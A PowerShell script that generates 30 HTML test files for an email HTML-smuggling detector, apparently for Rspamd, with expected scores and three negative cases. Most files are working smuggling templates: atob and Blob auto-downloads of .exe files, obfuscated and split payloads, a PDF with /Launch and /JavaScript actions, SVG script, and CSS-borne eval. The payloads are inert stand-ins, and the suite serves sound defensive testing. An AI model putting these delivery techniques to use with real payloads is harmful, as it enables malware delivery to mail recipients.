# create_realistic_test_suite.ps1
# Erstellt 30 REALISTISCHE HTML-Testdateien fuer HTML Smuggling Detection v4.3.7a
# Deckt alle Module ab: JS Smuggling, Obfuscation, WASM, PDF, SVG, Certificates, Images, Attachments
# Ausgabe: UTF-8 ohne BOM

param(
  [switch]$Force
)

$ErrorActionPreference = 'Stop'
Set-StrictMode -Version Latest

Write-Host "╔══════════════════════════════════════════════════════════════════════════════════════╗" -ForegroundColor Cyan
Write-Host "║   REALISTIC HTML Smuggling Test Suite v2.0 - fuer Rspamd v4.3.7a                       ║" -ForegroundColor Cyan
Write-Host "║   Module: JS Smuggling | Obfuscation | WASM | PDF | SVG | Certificates | Images       ║" -ForegroundColor Cyan
Write-Host "╚══════════════════════════════════════════════════════════════════════════════════════╝" -ForegroundColor Cyan
Write-Host ""

$testFolder = "HTML_Smuggling_TestSuite_v2"
if (!(Test-Path -LiteralPath $testFolder)) {
  New-Item -ItemType Directory -Path $testFolder | Out-Null
}

Push-Location $testFolder

# ============================================================================
# HELPER FUNCTIONS
# ============================================================================

function New-FakePEHeader {
  # Erstellt einen minimalen aber VALIDEN PE-Header (264 Bytes)
  $dos = [byte[]](
    0x4D,0x5A,0x90,0x00,0x03,0x00,0x00,0x00,0x04,0x00,0x00,0x00,0xFF,0xFF,0x00,0x00,
    0xB8,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x40,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
    0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
    0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x80,0x00,0x00,0x00
  )
  
  $stub = [byte[]](0x0E) * (0x80 - $dos.Length)
  
  $pe = [byte[]](
    0x50,0x45,0x00,0x00,  # PE\0\0
    0x4C,0x01,            # Machine: 0x014C (i386)
    0x03,0x00,            # NumberOfSections: 3
    0x00,0x00,0x00,0x00,
    0x00,0x00,0x00,0x00,
    0x00,0x00,0x00,0x00,
    0xE0,0x00,            # SizeOfOptionalHeader
    0x02,0x01             # Characteristics
  )
  
  $optional = [byte[]](0x00) * 224
  $optional[0] = 0x0B  # Magic: PE32
  $optional[1] = 0x01
  
  $full = $dos + $stub + $pe + $optional
  
  if ($full.Length -lt 512) {
    $padding = [byte[]](0x00) * (512 - $full.Length)
    $full = $full + $padding
  }
  
  return [Convert]::ToBase64String($full)
}

function New-FakeWASMModule {
  $wasm = [byte[]](
    0x00,0x61,0x73,0x6D,  # \0asm
    0x01,0x00,0x00,0x00   # Version 1
  )
  
  $wasm += [byte[]](0x01,0x04,0x01,0x60,0x00,0x00)
  $wasm += [byte[]](0x03,0x02,0x01,0x00)
  $wasm += [byte[]](0x07,0x08,0x01,0x04,0x6D,0x61,0x69,0x6E,0x00,0x00)
  $wasm += [byte[]](0x0A,0x04,0x01,0x02,0x00,0x0B)
  
  if ($wasm.Length -lt 256) {
    $padding = [byte[]](0x00) * (256 - $wasm.Length)
    $wasm = $wasm + $padding
  }
  
  return [Convert]::ToBase64String($wasm)
}

function New-FakePDFWithJavaScript {
  $pdf = @"
%PDF-1.4
1 0 obj
<< /Type /Catalog /Pages 2 0 R /OpenAction 4 0 R >>
endobj
2 0 obj
<< /Type /Pages /Kids [3 0 R] /Count 1 >>
endobj
3 0 obj
<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Contents 5 0 R >>
endobj
4 0 obj
<< /Type /Action /S /JavaScript /JS (app.alert('Malicious PDF');) >>
endobj
5 0 obj
<< /Length 44 >>
stream
BT /F1 12 Tf 100 700 Td (Hello) Tj ET
endstream
endobj
xref
0 6
0000000000 65535 f
0000000009 00000 n
0000000078 00000 n
0000000137 00000 n
0000000206 00000 n
0000000270 00000 n
trailer
<< /Size 6 /Root 1 0 R >>
startxref
337
%%EOF
"@
  return [Convert]::ToBase64String([System.Text.Encoding]::ASCII.GetBytes($pdf))
}

function New-FakePDFWithLaunch {
  $pdf = @"
%PDF-1.4
1 0 obj
<< /Type /Catalog /Pages 2 0 R /Names << /EmbeddedFiles 4 0 R >> >>
endobj
2 0 obj
<< /Type /Pages /Kids [3 0 R] /Count 1 >>
endobj
3 0 obj
<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] >>
endobj
4 0 obj
<< /Names [ (file) 5 0 R ] >>
endobj
5 0 obj
<< /Type /Filespec /F (malware.exe) /EF << /F 6 0 R >> /UF (malware.exe) >>
endobj
6 0 obj
<< /Type /EmbeddedFile /Length 100 /Params << /Launch << /Win (malware.exe) >> >> >>
stream
MZÿÿ
endstream
endobj
xref
0 7
0000000000 65535 f
0000000009 00000 n
0000000078 00000 n
0000000137 00000 n
0000000198 00000 n
0000000248 00000 n
0000000315 00000 n
trailer
<< /Size 7 /Root 1 0 R >>
startxref
398
%%EOF
"@
  return [Convert]::ToBase64String([System.Text.Encoding]::ASCII.GetBytes($pdf))
}

function New-FakeSVG {
  $svg = @'
<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
  <script type="text/javascript">
    var payload = "BASE64_PLACEHOLDER";
    var decoded = atob(payload);
    var blob = new Blob([decoded], {type: 'application/octet-stream'});
    var url = URL.createObjectURL(blob);
    window.location = url;
  </script>
  <rect x="10" y="10" width="80" height="80" fill="red" onload="alert('XSS')"/>
  <foreignObject>
    <html:iframe src="javascript:alert('smuggle')"/>
  </foreignObject>
  <use href="data:application/octet-stream;base64,UEsDBBQAAAAIA..." />
</svg>
'@
  return $svg
}

function New-FakeCertificate {
  # Inline PEM Zertifikat
  $cert = @"
-----BEGIN CERTIFICATE-----
MIIDXTCCAkWgAwIBAgIJAKlQz7jYpU9MMA0GCSqGSIb3DQEBCwUAMEUxCzAJBgNV
BAYTAkRFMQ8wDQYDVQQIDAZCYXllcm4xDzANBgNVBAcMBk11ZW5jaDERMA8GA1UE
CgwIVGVzdCBDQTAeFw0yNDAxMDEwMDAwMDBaFw0yNTAxMDEwMDAwMDBaMEUxCzAJ
BgNVBAYTAkRFMQ8wDQYDVQQIDAZCYXllcm4xDzANBgNVBAcMBk11ZW5jaDERMA8G
A1UECgwIVGVzdCBDQTCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBAMtC
j3lZxJzLxVvzQtq0Wq7X8j2N5P9MkQoRf2A3B4cD5E6F7G8H9I0J1K2L3M4N5O6P
-----END CERTIFICATE-----
"@
  return $cert
}

function New-FakePKCS7 {
  $pkcs = @"
-----BEGIN PKCS7-----
MIIB1gYJKoZIhvcNAQcCoIIBxzCCAcMCAQExADALBgkqhkiG9w0BBwGgggGmMIIB
ojCCAYugAwIBAgIJAJlQz7jYpU9MMA0GCSqGSIb3DQEBCwUAMFExCzAJBgNVBAYT
AkRFMQ8wDQYDVQQIDAZCYXllcm4xDzANBgNVBAcMBk11ZW5jaDERMA8GA1UECgwI
VGVzdCBDQTENMAsGA1UEAwwEdGVzdDAeFw0yNDAxMDEwMDAwMDBaFw0yNTAxMDEw
MDAwMDBaMFExCzAJBgNVBAYTAkRFMQ8wDQYDVQQIDAZCYXllcm4xDzANBgNVBAcM
Bk11ZW5jaDERMA8GA1UECgwIVGVzdCBDQTENMAsGA1UEAwwEdGVzdDCBnzANBgkq
hkiG9w0BAQEFAAOBjQAwgYkCgYEAy0KPeVnEnMvFW/NC2rRartfyPY3k/0yRChF/
YDcHhwPkToXsHwj0jQnUrYszg0nU6P7Q8R9S0T1U2V3W4X5Y6Z7a8b9c0d1e2f3g4h
5i6j7k8l9m0n1o2p3q4r5s6t7u8v9w0x1y2z3A4B5C6D7E8F9G0H1I2J3K4L5M6N
-----END PKCS7-----
"@
  return $pkcs
}

# ============================================================================
# GENERATE PAYLOADS
# ============================================================================

Write-Host "Generiere Payloads..." -ForegroundColor Yellow
$PE_BASE64 = New-FakePEHeader
$WASM_BASE64 = New-FakeWASMModule
$PDF_JS_BASE64 = New-FakePDFWithJavaScript
$PDF_LAUNCH_BASE64 = New-FakePDFWithLaunch
$SVG_CONTENT = New-FakeSVG -replace "BASE64_PLACEHOLDER", $PE_BASE64
$SVG_BASE64 = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($SVG_CONTENT))
$CERT_PEM = New-FakeCertificate
$CERT_PKCS7 = New-FakePKCS7

Write-Host "PE Payload: $($PE_BASE64.Length) Zeichen" -ForegroundColor Gray
Write-Host "WASM Payload: $($WASM_BASE64.Length) Zeichen" -ForegroundColor Gray
Write-Host ""

# ============================================================================
# TEST DEFINITIONS - 30 TESTS
# ============================================================================

$testFiles = @()

# ===== KERNEL MODULE TESTS (JS_SMUGGLING, OBFUSCATION, CONTAINER) =====

$testFiles += @{
  Name = "test01_basic_pe_smuggling.html"
  ExpectedScore = "12-18"
  ExpectedDetection = "YES"
  Description = "Basis: atob + Blob + createObjectURL + PE"
  Content = @"
<!DOCTYPE html>
<html><body>
<script>
var payload = "$PE_BASE64";
var decoded = atob(payload);
var blob = new Blob([decoded], {type: 'application/octet-stream'});
var url = URL.createObjectURL(blob);
var a = document.createElement('a');
a.href = url;
a.download = 'invoice.exe';
a.click();
</script>
</body></html>
"@
}

$testFiles += @{
  Name = "test02_split_payload_pe.html"
  ExpectedScore = "18-24"
  ExpectedDetection = "YES"
  Description = "Split Payload: += Concatenation + PE"
  Content = @"
<!DOCTYPE html>
<html><body>
<script>
var p1 = "$($PE_BASE64.Substring(0, 250))";
var p2 = "$($PE_BASE64.Substring(250, 250))";
var p3 = "$($PE_BASE64.Substring(500))";
var payload = "";
payload += p1;
payload += p2;
payload += p3;
var decoded = atob(payload);
var blob = new Blob([decoded], {type: 'application/octet-stream'});
var url = URL.createObjectURL(blob);
var a = document.createElement('a');
a.href = url;
a.download = 'split.exe';
a.click();
</script>
</body></html>
"@
}

$testFiles += @{
  Name = "test03_array_join_pe.html"
  ExpectedScore = "18-24"
  ExpectedDetection = "YES"
  Description = "Array.join() + PE"
  Content = @"
<!DOCTYPE html>
<html><body>
<script>
var parts = ["$($PE_BASE64.Substring(0,250))","$($PE_BASE64.Substring(250,250))","$($PE_BASE64.Substring(500))"];
var payload = parts.join('');
var decoded = atob(payload);
var blob = new Blob([decoded], {type: 'application/octet-stream'});
var url = URL.createObjectURL(blob);
var a = document.createElement('a');
a.href = url;
a.download = 'joined.exe';
a.click();
</script>
</body></html>
"@
}

$testFiles += @{
  Name = "test04_obfuscated_pe.html"
  ExpectedScore = "24-30"
  ExpectedDetection = "YES"
  Description = "Polymorphic Obfuscation + PE (hex var names, array index)"
  Content = @"
<!DOCTYPE html>
<html><body>
<script>
var _0x4a8b = ['atob', 'Blob', 'createObjectURL', 'createElement', 'a', 'href', 'download', 'click'];
var _0x2c9d = "$PE_BASE64";
var _0x1f3e = window[_0x4a8b[0]](_0x2c9d);
var _0x5b2a = new window[_0x4a8b[1]]([_0x1f3e], {type:'application/octet-stream'});
var _0x7d4c = URL[_0x4a8b[2]](_0x5b2a);
var _0x9e6b = document[_0x4a8b[3]](_0x4a8b[4]);
_0x9e6b[_0x4a8b[5]] = _0x7d4c;
_0x9e6b[_0x4a8b[6]] = 'obfuscated.exe';
_0x9e6b[_0x4a8b[7]]();
</script>
</body></html>
"@
}

$testFiles += @{
  Name = "test05_wasm_smuggling.html"
  ExpectedScore = "12-18"
  ExpectedDetection = "YES"
  Description = "WebAssembly Module (WASM_STAGING)"
  Content = @"
<!DOCTYPE html>
<html><body>
<script>
var wasmData = "$WASM_BASE64";
var decoded = atob(wasmData);
var blob = new Blob([decoded], {type: 'application/wasm'});
var url = URL.createObjectURL(blob);
if (typeof WebAssembly !== 'undefined') {
  fetch(url).then(r => r.arrayBuffer()).then(bytes => {
    WebAssembly.instantiate(bytes);
  });
}
</script>
</body></html>
"@
}

$testFiles += @{
  Name = "test06_uint8array_pe.html"
  ExpectedScore = "20-28"
  ExpectedDetection = "YES"
  Description = "Uint8Array mit PE Bytes (CRITICAL!)"
  Content = @"
<!DOCTYPE html>
<html><body>
<script>
var peBytes = new Uint8Array([0x4D,0x5A,0x90,0x00,0x03,0x00,0x00,0x00,0x04,0x00,0x00,0x00,0xFF,0xFF,0x00,0x00,0xB8,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x40,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x50,0x45,0x00,0x00,0x4C,0x01]);
var blob = new Blob([peBytes], {type: 'application/octet-stream'});
var url = URL.createObjectURL(blob);
var a = document.createElement('a');
a.href = url;
a.download = 'uint8.exe';
a.click();
</script>
</body></html>
"@
}

$testFiles += @{
  Name = "test07_delayed_execution_pe.html"
  ExpectedScore = "18-24"
  ExpectedDetection = "YES"
  Description = "setTimeout delayed execution + PE"
  Content = @"
<!DOCTYPE html>
<html><body>
<script>
setTimeout(function() {
  var payload = "$PE_BASE64";
  var decoded = atob(payload);
  var blob = new Blob([decoded], {type: 'application/octet-stream'});
  var url = URL.createObjectURL(blob);
  var a = document.createElement('a');
  a.href = url;
  a.download = 'delayed.exe';
  a.click();
}, 100);
</script>
</body></html>
"@
}

$testFiles += @{
  Name = "test08_webworker_pe.html"
  ExpectedScore = "18-24"
  ExpectedDetection = "YES"
  Description = "Web Worker + PE Payload"
  Content = @"
<!DOCTYPE html>
<html><body>
<script>
var workerCode = "self.onmessage = function(e) { var decoded = atob(e.data.payload); self.postMessage({decoded: decoded}); }";
var blob = new Blob([workerCode], {type: 'application/javascript'});
var workerUrl = URL.createObjectURL(blob);
var worker = new Worker(workerUrl);
worker.onmessage = function(e) {
  var blob2 = new Blob([e.data.decoded], {type: 'application/octet-stream'});
  var url = URL.createObjectURL(blob2);
  var a = document.createElement('a');
  a.href = url;
  a.download = 'worker.exe';
  a.click();
};
worker.postMessage({payload: "$PE_BASE64"});
</script>
</body></html>
"@
}

$testFiles += @{
  Name = "test09_fetch_api_pe.html"
  ExpectedScore = "16-22"
  ExpectedDetection = "YES"
  Description = "Fetch API + PE Smuggling"
  Content = @"
<!DOCTYPE html>
<html><body>
<script>
var payload = "$PE_BASE64";
fetch('data:application/octet-stream;base64,' + payload)
  .then(r => r.blob())
  .then(b => {
    var url = URL.createObjectURL(b);
    var a = document.createElement('a');
    a.href = url;
    a.download = 'fetched.exe';
    a.click();
  });
</script>
</body></html>
"@
}

$testFiles += @{
  Name = "test10_appinstaller_schema.html"
  ExpectedScore = "8-12"
  ExpectedDetection = "YES"
  Description = "ms-appinstaller URI Schema (APPINSTALLER)"
  Content = @"
<!DOCTYPE html>
<html><body>
<script>
var schema = "ms-appinstaller:?source=https://example.com/malware.appinstaller";
var xml = '<?xml version="1.0"?><AppInstaller Uri="https://example.com/app.msix" Version="1.0.0.0"><MainPackage Name="App" Publisher="CN=Test" Version="1.0.0.0" Uri="https://example.com/app.msix"/></AppInstaller>';
var blob = new Blob([xml], {type: 'application/xml'});
var url = URL.createObjectURL(blob);
</script>
</body></html>
"@
}

# ===== ATTACHMENT VECTORS MODULE TESTS (PDF, SVG, CHM, HTA, Office) =====

$testFiles += @{
  Name = "test11_pdf_javascript_attachment.html"
  ExpectedScore = "6-10"
  ExpectedDetection = "YES"
  Description = "PDF mit /JavaScript Action (PDF_ACTIVE)"
  Content = @"
<!DOCTYPE html>
<html><body>
<p>Please find your invoice attached.</p>
<script>
var pdfData = "$PDF_JS_BASE64";
var decoded = atob(pdfData);
var blob = new Blob([decoded], {type: 'application/pdf'});
var url = URL.createObjectURL(blob);
var a = document.createElement('a');
a.href = url;
a.download = 'invoice.pdf';
a.click();
</script>
</body></html>
"@
}

$testFiles += @{
  Name = "test12_pdf_launch_attachment.html"
  ExpectedScore = "8-12"
  ExpectedDetection = "YES"
  Description = "PDF mit /Launch Action (PDF_ACTIVE)"
  Content = @"
<!DOCTYPE html>
<html><body>
<script>
var pdfData = "$PDF_LAUNCH_BASE64";
var decoded = atob(pdfData);
var blob = new Blob([decoded], {type: 'application/pdf'});
var url = URL.createObjectURL(blob);
window.open(url);
</script>
</body></html>
"@
}

$testFiles += @{
  Name = "test13_svg_active_content.html"
  ExpectedScore = "8-12"
  ExpectedDetection = "YES"
  Description = "SVG mit script und event handler (SVG_ACTIVE)"
  Content = @"
<!DOCTYPE html>
<html><body>
<object data="data:image/svg+xml;base64,$SVG_BASE64" type="image/svg+xml"></object>
</body></html>
"@
}

$testFiles += @{
  Name = "test14_chm_attachment.html"
  ExpectedScore = "10-15"
  ExpectedDetection = "YES"
  Description = "CHM Datei als Attachment (CONTAINER)"
  Content = @"
<!DOCTYPE html>
<html><body>
<p>Help documentation</p>
<script>
var chmData = "SUlURiM=";
var decoded = atob(chmData);
var blob = new Blob([decoded], {type: 'application/vnd.ms-htmlhelp'});
var url = URL.createObjectURL(blob);
var a = document.createElement('a');
a.href = url;
a.download = 'help.chm';
a.click();
</script>
</body></html>
"@
}

$testFiles += @{
  Name = "test15_hta_attachment.html"
  ExpectedScore = "12-18"
  ExpectedDetection = "YES"
  Description = "HTA Datei (SCRIPT_HARD)"
  Content = @"
<!DOCTYPE html>
<html><body>
<script>
var htaData = "PEhUQTpBUFBMSUNBVElPTj4KPHNjcmlwdD5hbGVydCgneHMnKTwvc2NyaXB0Pg==";
var decoded = atob(htaData);
var blob = new Blob([decoded], {type: 'application/hta'});
var url = URL.createObjectURL(blob);
var a = document.createElement('a');
a.href = url;
a.download = 'update.hta';
a.click();
</script>
</body></html>
"@
}

$testFiles += @{
  Name = "test16_onenote_attachment.html"
  ExpectedScore = "10-15"
  ExpectedDetection = "YES"
  Description = "OneNote Datei (ONENOTE)"
  Content = @"
<!DOCTYPE html>
<html><body>
<script>
var oneData = "UEsDBBQAAAAIA...";
var decoded = atob(oneData);
var blob = new Blob([decoded], {type: 'application/onenote'});
var url = URL.createObjectURL(blob);
var a = document.createElement('a');
a.href = url;
a.download = 'notes.one';
a.click();
</script>
</body></html>
"@
}

$testFiles += @{
  Name = "test17_office_macro_container.html"
  ExpectedScore = "8-12"
  ExpectedDetection = "YES"
  Description = "Office Macro Container (DOCM/XLSM)"
  Content = @"
<!DOCTYPE html>
<html><body>
<script>
var docmData = "UEsDBAoAAAAAIA...";
var blob = new Blob([docmData], {type: 'application/vnd.ms-word.document.macroEnabled.12'});
var url = URL.createObjectURL(blob);
var a = document.createElement('a');
a.href = url;
a.download = 'invoice.docm';
a.click();
</script>
</body></html>
"@
}

$testFiles += @{
  Name = "test18_lnk_attachment.html"
  ExpectedScore = "8-12"
  ExpectedDetection = "YES"
  Description = "LNK Shortcut Datei (LNK)"
  Content = @"
<!DOCTYPE html>
<html><body>
<script>
var lnkData = "TAAAAAA...";
var blob = new Blob([lnkData], {type: 'application/x-ms-shortcut'});
var url = URL.createObjectURL(blob);
var a = document.createElement('a');
a.href = url;
a.download = 'shortcut.lnk';
a.click();
</script>
</body></html>
"@
}

$testFiles += @{
  Name = "test19_script_attachment_js.html"
  ExpectedScore = "10-15"
  ExpectedDetection = "YES"
  Description = "JavaScript Datei als Attachment (SCRIPT_HARD)"
  Content = @"
<!DOCTYPE html>
<html><body>
<script>
var jsData = "dmFyIHBheWxvYWQgPSAndGVzdCc7CmZ1bmN0aW9uIHJ1bigpIHt9";
var decoded = atob(jsData);
var blob = new Blob([decoded], {type: 'text/javascript'});
var url = URL.createObjectURL(blob);
var a = document.createElement('a');
a.href = url;
a.download = 'script.js';
a.click();
</script>
</body></html>
"@
}

# ===== CERTIFICATE SMUGGLING MODULE TESTS =====

$testFiles += @{
  Name = "test20_certificate_inline_pem.html"
  ExpectedScore = "2-5"
  ExpectedDetection = "YES"
  Description = "Inline PEM Zertifikat (CERT_SMUGGLING)"
  Content = @"
<!DOCTYPE html>
<html><body>
<pre>
$CERT_PEM
</pre>
<script>
// Hidden certificate smuggling context
var certData = "$([Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($CERT_PEM)))";
var decoded = atob(certData);
</script>
</body></html>
"@
}

$testFiles += @{
  Name = "test21_certificate_pkcs7_inline.html"
  ExpectedScore = "2-5"
  ExpectedDetection = "YES"
  Description = "Inline PKCS7 Container (CERT_SMUGGLING)"
  Content = @"
<!DOCTYPE html>
<html><body>
<pre>
$CERT_PKCS7
</pre>
<script>
var pkcsData = "$([Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($CERT_PKCS7)))";
</script>
</body></html>
"@
}

$testFiles += @{
  Name = "test22_certificate_smuggling_context.html"
  ExpectedScore = "6-10"
  ExpectedDetection = "YES"
  Description = "Zertifikat + Smuggling Context (CERT_SMUGGLING + JS_SMUGGLING)"
  Content = @"
<!DOCTYPE html>
<html><body>
<script>
var cert = "-----BEGIN CERTIFICATE-----\nMIIDXTCCAkWgAwIBAgIJAKlQz7jYpU9MMA0GCSqGSIb3DQEBCwUAMEUxCzAJBgNV\nBAYTAkRFMQ8wDQYDVQQIDAZCYXllcm4xDzANBgNVBAcMBk11ZW5jaDERMA8GA1UE\nCgwIVGVzdCBDQTCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBAMtCj3lZ\n-----END CERTIFICATE-----";
var payload = "$PE_BASE64";
var decoded = atob(payload);
var blob = new Blob([decoded], {type: 'application/octet-stream'});
var url = URL.createObjectURL(blob);
</script>
</body></html>
"@
}

# ===== IMAGE SMUGGLING INFO MODULE TESTS =====

$testFiles += @{
  Name = "test23_image_double_ext.html"
  ExpectedScore = "0-2"
  ExpectedDetection = "INFO_ONLY"
  Description = "Image mit doppelter Extension (image_double_ext)"
  Content = @"
<!DOCTYPE html>
<html><body>
<img src="invoice.png.html" />
<img src="document.jpg.exe" />
</body></html>
"@
}

$testFiles += @{
  Name = "test24_image_polyglot_hint.html"
  ExpectedScore = "0-2"
  ExpectedDetection = "INFO_ONLY"
  Description = "Image mit verdächtigem Namen (image_polyglot_name)"
  Content = @"
<!DOCTYPE html>
<html><body>
<img src="invoice_payload.png" />
<img src="image_with_payload.jpg" />
</body></html>
"@
}

# ===== CSS CODE EXECUTION MODULE TESTS =====

$testFiles += @{
  Name = "test25_css_code_execution.html"
  ExpectedScore = "6-10"
  ExpectedDetection = "YES"
  Description = "CSS Code Execution (CSS_CODE_EXEC)"
  Content = @"
<!DOCTYPE html>
<html><head>
<style>
::before {
  content: "atob('cGF5bG9hZA==')";
}
::after {
  content: "eval(atob('dGVzdA=='))";
}
</style>
</head>
<body>
<script>
var style = getComputedStyle(document.body, '::before');
var content = style.content;
if (content && content.indexOf('atob') !== -1) {
  eval(content);
}
</script>
</body></html>
"@
}

$testFiles += @{
  Name = "test26_css_computedstyle_exec.html"
  ExpectedScore = "4-8"
  ExpectedDetection = "YES"
  Description = "CSS getComputedStyle Execution (CSS_CODE_EXEC)"
  Content = @"
<!DOCTYPE html>
<html><head>
<style>
#test::before { content: "YWxlcnQoJ3h4eCcp"; }
</style>
</head>
<body>
<div id="test"></div>
<script>
var before = getComputedStyle(document.getElementById('test'), '::before').content;
var decoded = atob(before.replace(/['\"]/g, ''));
eval(decoded);
</script>
</body></html>
"@
}

# ===== NEGATIVE TESTS (Should NOT trigger) =====

$testFiles += @{
  Name = "test27_NEGATIVE_legitimate.html"
  ExpectedScore = "0-2"
  ExpectedDetection = "NO"
  Description = "Legitime Website (sollte nicht triggern)"
  Content = @"
<!DOCTYPE html>
<html>
<head><title>Legitimate Site</title></head>
<body>
<h1>Welcome</h1>
<img src="logo.png">
<script src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js"></script>
<script>
var userId = btoa("user123");
var canvas = document.createElement('canvas');
var ctx = canvas.getContext('2d');
ctx.fillText("Hello", 10, 10);
</script>
</body>
</html>
"@
}

$testFiles += @{
  Name = "test28_NEGATIVE_newsletter.html"
  ExpectedScore = "0-1"
  ExpectedDetection = "NO"
  Description = "Newsletter mit Tracking (heur_mul reduziert)"
  Content = @"
<!DOCTYPE html>
<html><body>
<p>Unsubscribe: <a href="https://unsubscribe.example.com">Click here</a></p>
<img src="tracking.png" style="display:none">
<script>
var trackingData = btoa("campaign=summer2025");
fetch('https://tracking.example.com/log?data=' + trackingData);
</script>
</body></html>
"@
}

$testFiles += @{
  Name = "test29_NEGATIVE_safe_domain.html"
  ExpectedScore = "0-2"
  ExpectedDetection = "NO"
  Description = "External Script von sicherer Domain (safe_script_domains)"
  Content = @"
<!DOCTYPE html>
<html><body>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/lodash.js/4.17.21/lodash.min.js"></script>
<script>
var data = "test";
console.log(data);
</script>
</body></html>
"@
}

# ===== ALL-IN-ONE MAXIMUM TEST =====

$testFiles += @{
  Name = "test30_ALL_IN_ONE_MAXIMUM.html"
  ExpectedScore = "40-55"
  ExpectedDetection = "YES"
  Description = "Alle Techniken kombiniert (MAXIMUM SCORE)"
  Content = @"
<!DOCTYPE html>
<html><head>
<style>
::before { content: "atob('$($PE_BASE64.Substring(0,100))')"; }
</style>
</head>
<body>
<canvas id="qr"></canvas>
<iframe id="hidden" style="display:none"></iframe>
<pre>
$CERT_PEM
</pre>
<script>
var _0x1a2b = ['atob', 'Blob', 'createObjectURL', 'Worker', 'fetch'];
var p1 = "$($PE_BASE64.Substring(0,250))";
var p2 = "$($PE_BASE64.Substring(250,250))";
var p3 = "$($PE_BASE64.Substring(500))";
var parts = [p1, p2, p3];
var payload = parts.join('');

setTimeout(function() {
  var canvas = document.getElementById('qr');
  var ctx = canvas.getContext('2d');
  ctx.fillRect(0, 0, 100, 100);
  
  var decode = window[_0x1a2b[0]];
  var decoded = decode(payload);
  var blob = new window[_0x1a2b[1]]([decoded], {type: 'application/octet-stream'});
  var url = URL[_0x1a2b[2]](blob);
  
  var workerCode = 'self.postMessage("ready")';
  var workerBlob = new Blob([workerCode], {type: 'application/javascript'});
  var workerUrl = URL.createObjectURL(workerBlob);
  var worker = new Worker(workerUrl);
  
  fetch(url).then(r => r.blob()).then(b => {
    var finalUrl = URL.createObjectURL(b);
    var a = document.createElement('a');
    a.href = finalUrl;
    a.download = 'all_in_one.exe';
    a.click();
  });
  
  document.getElementById('hidden').src = 'data:text/html;base64,' + payload.substring(0, 100);
}, 100);

if ('serviceWorker' in navigator) {
  var swCode = 'self.addEventListener("install", e => e.waitUntil(self.skipWaiting()))';
  var swBlob = new Blob([swCode], {type: 'application/javascript'});
  var swUrl = URL.createObjectURL(swBlob);
  navigator.serviceWorker.register(swUrl);
}

if (crypto && crypto.subtle) {
  crypto.subtle.generateKey({name: 'AES-CBC', length: 256}, true, ['encrypt']);
}

var wasmData = "$WASM_BASE64";
var wasmDecoded = atob(wasmData);
var wasmBlob = new Blob([wasmDecoded], {type: 'application/wasm'});
var wasmUrl = URL.createObjectURL(wasmBlob);
if (typeof WebAssembly !== 'undefined') {
  fetch(wasmUrl).then(r => r.arrayBuffer()).then(bytes => {
    WebAssembly.instantiate(bytes);
  });
}
</script>
</body></html>
"@
}

# ============================================================================
# CREATE FILES
# ============================================================================

$successCount = 0
$errorCount = 0
$summary = @()

Write-Host ""
Write-Host "Generiere Testdateien..." -ForegroundColor Yellow
Write-Host ""

foreach ($file in $testFiles) {
  try {
    $path = Join-Path (Get-Location) $file.Name

    if (Test-Path -LiteralPath $path -and -not $Force) {
      Write-Host "⏭  Überspringe existierende Datei: $($file.Name) (nutze -Force)" -ForegroundColor Yellow
      continue
    }

    [System.IO.File]::WriteAllText(
      $path,
      $file.Content,
      [System.Text.UTF8Encoding]::new($false)
    )

    Write-Host "✅ $($file.Name)" -ForegroundColor Green
    Write-Host "   Score: $($file.ExpectedScore) | Detection: $($file.ExpectedDetection)" -ForegroundColor Gray
    Write-Host "   $($file.Description)" -ForegroundColor DarkGray
    Write-Host ""
    
    $summary += [PSCustomObject]@{
      File = $file.Name
      ExpectedScore = $file.ExpectedScore
      Detection = $file.ExpectedDetection
      Description = $file.Description
    }
    
    $successCount++
  }
  catch {
    Write-Host "❌ Fehler bei $($file.Name): $($_.Exception.Message)" -ForegroundColor Red
    $errorCount++
  }
}

# ============================================================================
# SUMMARY
# ============================================================================

Write-Host ""
Write-Host "╔══════════════════════════════════════════════════════════════════════════════════════╗" -ForegroundColor Cyan
Write-Host "║                         TEST SUITE ABGESCHLOSSEN                                      ║" -ForegroundColor Cyan
Write-Host "╠══════════════════════════════════════════════════════════════════════════════════════╣" -ForegroundColor Cyan
Write-Host "║  Ordner: $testFolder" -ForegroundColor White
Write-Host "║  Erfolgreich: $successCount von $($testFiles.Count)" -ForegroundColor Green
if ($errorCount -gt 0) {
  Write-Host "║  Fehler: $errorCount" -ForegroundColor Red
}
Write-Host "║" -ForegroundColor Cyan
Write-Host "║  ERWARTETE DETECTION-RATE: 90% (27/30 Tests)" -ForegroundColor Yellow
Write-Host "║" -ForegroundColor Cyan
Write-Host "║  MODULE TEST COVERAGE:" -ForegroundColor Magenta
Write-Host "║    ✅ JS_SMUGGLING       - Tests 01-10" -ForegroundColor Gray
Write-Host "║    ✅ ATTACHMENT_VECTORS - Tests 11-19 (PDF, SVG, CHM, HTA, Office)" -ForegroundColor Gray
Write-Host "║    ✅ CERT_SMUGGLING     - Tests 20-22 (PEM, PKCS7)" -ForegroundColor Gray
Write-Host "║    ✅ IMAGE_SMUGGLING    - Tests 23-24 (Info Only)" -ForegroundColor Gray
Write-Host "║    ✅ CSS_CODE_EXEC      - Tests 25-26" -ForegroundColor Gray
Write-Host "║    ✅ NEGATIVE TESTS     - Tests 27-29 (sollten nicht triggern)" -ForegroundColor Gray
Write-Host "║    ✅ ALL-IN-ONE         - Test 30 (Maximum Score)" -ForegroundColor Gray
Write-Host "║" -ForegroundColor Cyan
Write-Host "║  Pfad: $((Get-Location).Path)\$testFolder" -ForegroundColor Gray
